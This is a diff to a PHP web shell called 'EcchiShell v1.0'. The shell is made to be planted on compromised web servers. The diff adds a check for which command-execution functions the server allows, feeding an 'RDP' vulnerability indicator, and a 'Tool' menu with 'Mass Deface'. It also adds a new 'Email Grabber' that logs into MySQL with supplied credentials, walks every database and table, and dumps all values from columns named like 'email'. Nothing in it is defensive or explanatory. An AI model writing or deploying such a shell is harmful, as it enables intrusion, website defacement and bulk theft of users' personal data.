@@ -1,5 +1,5 @@
 <?php
-define('version', '1.0 ( Beta Version )');
+define('version', '1.0');
 define('author', './EcchiExploit');
 
 set_time_limit(0);
@@ -134,6 +134,23 @@ function perms($file)
    return $info;
 }
 
+function getexist()
+{
+   if (function_exists('exec')) {
+      $disable = 'Enable';
+   } else if (function_exists('shell_exec')) {
+      $disable = 'Enable';
+   } else if (function_exists('system')) {
+      $disable = 'Enable';
+   } else if (function_exists('passthru')) {
+      $disable = 'Enable';
+   } else {
+      $disable = 'Disable';
+   }
+
+   return $disable;
+}
+
 function getact($dir, $file, $label)
 {
 ?>
@@ -163,8 +180,7 @@ function shell()
    $disable = @ini_get('disable_functions');
    $disable = (!empty($disable)) ? $disable : 'NONE';
    $os = substr(strtoupper(PHP_OS), 0, 3) === "WIN" ? "Windows" : "Linux";
-   $exec2check = (function_exists('exec')) ? 'Enable' : 'Disable';
-   $checkos = ($os !== 'Windows' && $exec2check !== 'Disable') ? "Can't Create RDP" : 'Vuln To Create RDP';
+   $checkrdp = ($os !== 'Windows' && getexist() !== 'Disable') ? "Can't Create RDP" : 'Vuln To Create RDP';
 ?>
    <!DOCTYPE html>
    <html lang="en">
@@ -180,6 +196,7 @@ function shell()
       <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.15.3/css/all.css" />
       <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l" crossorigin="anonymous">
       <title>EcchiShell v1.0</title>
+      <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
    </head>
 
    <style type="text/css">
@@ -207,14 +224,14 @@ function shell()
                      <a class="nav-link" href="<?= "?dir=$dir&opt=upload" ?>">Upload File</a>
                   </button>
                </li>
-               <li>
+               <li class="nav-item">
                   <button class="btn btn-outline-secondary border-0">
-                     <a class="nav-link" data-toggle="collapse" href="#info" role="button" aria-expanded="false" aria-controls="info">System Info</a>
+                     <a class="nav-link" data-toggle="collapse" href="#info" role="button" data-target="#info" aria-expanded="false" aria-controls="info">System Info</a>
                   </button>
                </li>
-               <li>
+               <li class="nav-item">
                   <button class="btn btn-outline-secondary border-0">
-                     <a class="nav-link" href="<?= "?dir=$dir&opt=mass" ?>">Mass Deface</a>
+                     <a class="nav-link" data-toggle="collapse" href="#tool" role="button" data-target="#tool" aria-expanded="false" aria-controls="tool">Tool</a>
                   </button>
                </li>
             </ul>
@@ -236,12 +253,26 @@ function shell()
                   echo "'>$cdir</a>/";
                }
                ?>
+               <div class="collapse multi-collapse p-3" id="tool">
+                  <div class="card card-body bg-dark text-center">
+                     <p>
+                        <a class="btn btn-outline-info text-white" href="<?= "?dir=$dir&opt=mass" ?>">
+                           <i class="fad fa-clone"></i>
+                           Mass Deface
+                        </a>
+                        <a class="btn btn-outline-info text-white" href="<?= "?dir=$dir&opt=email" ?>">
+                           <i class="fad fa-mail-bulk"></i>
+                           Email Grabber
+                        </a>
+                     </p>
+                  </div>
+               </div>
                <div class="collapse multi-collapse p-3" id="info">
                   <div class="card card-body">
                      <div class="font-weight-bold text-info">
                         <p>Shell Version : <span class="text-dark"><?= version ?></p>
                         <p>OS : <span class="text-dark"><?= $os ?></p>
-                        <p>RDP : <span class="text-dark"><?= $checkos ?></p>
+                        <p>RDP : <span class="text-dark"><?= $checkrdp ?></p>
                         <p>PHP Version : <span class="text-dark"><?= PHP_VERSION ?></p>
                         <p>Software : <span class="text-dark"><?= $_SERVER['SERVER_SOFTWARE'] ?></p>
                         <p>Information System : <span class="text-dark"><?= php_uname() ?></p>
@@ -381,6 +412,97 @@ function shell()
                   <button type="submit" class="btn btn-light form-control">Submit</button>
                </div>
             </form>
+         <?php
+         } else if ($_GET['opt'] == 'email') {
+         ?>
+            <div class="row justify-content-center mt-0 p-1">
+               <div class="md-0">
+                  <div class="card card-body bg-dark">
+                     <form method="POST">
+                        <div class="mb-3">
+                           <div class="form-group">
+                              <div class="input-group is-invalid">
+                                 <div class="input-group-prepend">
+                                    <label class="input-group-text" for="host">Hostname</label>
+                                 </div>
+                                 <input type="text" class="form-control" id="host" name="hostname" placeholder="hostname">
+                              </div>
+                           </div>
+                        </div>
+                        <div class="mb-3">
+                           <div class="form-group">
+                              <div class="input-group is-invalid">
+                                 <div class="input-group-prepend">
+                                    <label class="input-group-text" for="user">Username</label>
+                                 </div>
+                                 <input type="text" class="form-control" id="user" name="user" placeholder="username">
+                              </div>
+                           </div>
+                        </div>
+                        <div class="mb-3">
+                           <div class="form-group">
+                              <div class="input-group is-invalid">
+                                 <div class="input-group-prepend">
+                                    <label class="input-group-text" for="pass">Password</label>
+                                 </div>
+                                 <input type="text" class="form-control" id="pas" name="pass" placeholder="password">
+                              </div>
+                           </div>
+                        </div>
+                        <div class="mb-3">
+                           <div class="form-group">
+                              <div class="input-group is-invalid">
+                                 <div class="input-group-prepend">
+                                    <label class="input-group-text" for="db">Database</label>
+                                 </div>
+                                 <input type="text" class="form-control" id="db" name="database" placeholder="dbname (opsional)">
+                              </div>
+                           </div>
+                        </div>
+                        <div class="form-group">
+                           <button class="btn btn-outline-info form-control" type="submit">Grabber!!</button>
+                        </div>
+                     </form>
+                     <div class="form-group">
+                        <?php
+                        if (isset($_POST['database'])) {
+                           $hostname   = htmlspecialchars($_POST['hostname']);
+                           $user       = htmlspecialchars($_POST['user']);
+                           $pass       = htmlspecialchars($_POST['pass']);
+
+                           $conn = mysqli_connect($hostname, $user, $pass);
+                           if (!$conn) {
+                              die('<p class="text-white">Connect Database Error : ' . mysqli_connect_error() . '</p>');
+                           }
+
+                           $query1 = mysqli_query($conn, 'show databases');
+                           while ($row = mysqli_fetch_array($query1)) {
+                              $query2 = mysqli_query($conn, 'show tables from ' . $row['Database']);
+                              while ($tables = mysqli_fetch_array($query2)) {
+                                 $query3 = mysqli_query($conn, 'show columns from ' . $row['Database'] . '.' . $tables['Tables_in_' . $row['Database']] . ' in ' . $row['Database']);
+                                 while ($columns = mysqli_fetch_array($query3)) {
+                                    if (preg_match('/email/', $columns['Field'])) {
+                                       $end_query = 'select ' . $columns['Field'] . ' from ' . $row['Database'] . '.' . $tables['Tables_in_' . $row['Database']];
+                                       $final_connect_query = mysqli_query($conn, $end_query);
+                                       if (mysqli_num_rows($final_connect_query) > 0) {
+                                          echo '<textarea class="form-control" rows="5">';
+                                          while ($email = mysqli_fetch_array($final_connect_query)) {
+                                             if (strstr($email[$columns['Field']], "@")) {
+                                                echo $email[$columns['Field']] . PHP_EOL;
+                                             }
+                                          }
+                                          echo '</textarea>';
+                                       }
+                                    }
+                                 }
+                              }
+                           }
+                        }
+                        ?>
+                     </div>
+                  </div>
+               </div>
+            </div>
          <?php
          }
 
@@ -759,10 +881,7 @@ function shell()
                   };
 
                   function scrollFunction() {
-                     if (
-                        document.body.scrollTop > 20 ||
-                        document.documentElement.scrollTop > 20
-                     ) {
+                     if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
                         mybutton.style.display = "block";
                      } else {
                         mybutton.style.display = "none";
@@ -776,7 +895,6 @@ function shell()
                      document.documentElement.scrollTop = 0;
                   }
                </script>
-               <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
                <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-Piv4xVNRyMGpqkS2by6br4gNJ7DXjqk09RmUpJ8jgGtD7zP9yug3goQfGII0yAns" crossorigin="anonymous"></script>
    </body>
 
